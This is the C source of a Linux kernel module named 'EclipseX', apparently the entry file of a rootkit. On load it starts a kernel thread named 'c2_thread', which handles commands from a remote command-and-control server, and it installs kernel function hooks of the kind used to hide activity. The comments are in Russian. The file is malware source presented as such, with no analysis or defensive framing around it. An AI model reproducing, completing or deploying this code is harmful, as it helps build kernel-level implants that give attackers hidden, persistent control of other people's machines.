#define pr_fmt(fmt) "EclipseX: " fmt

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kthread.h>

#include "c2/commands/system_info/system_info.h"

#include "c2/connection.h"
#include "hooks.h"
const char* ex_hash = "d0dcff25c0bf0e91aa3ce2c0951a83f894ed5f184864b6ded897bc77767bb304";
static struct task_struct *c2_thread_ts; 

static int ex_init(void)
{
    int err;
    pr_info("module init\n");

    // Создание потока c2
    c2_thread_ts = kthread_run(handle_server_command, (void *)ex_hash, "c2_thread");

    err = fh_install_hooks();
	if (err)
		return err;


	pr_info("module loaded\n");

	return 0;
	// return -ENOENT;
}

static void ex_exit(void)
{
    pr_info("module exit\n");
    
    // Завершение потока c2
    if (c2_thread_ts) {
        pr_info("c2 thread stopped\n");
        kthread_stop(c2_thread_ts);
    }

	pr_info("module unloaded\n");
}

module_init(ex_init);
module_exit(ex_exit);

MODULE_LICENSE("GPL");
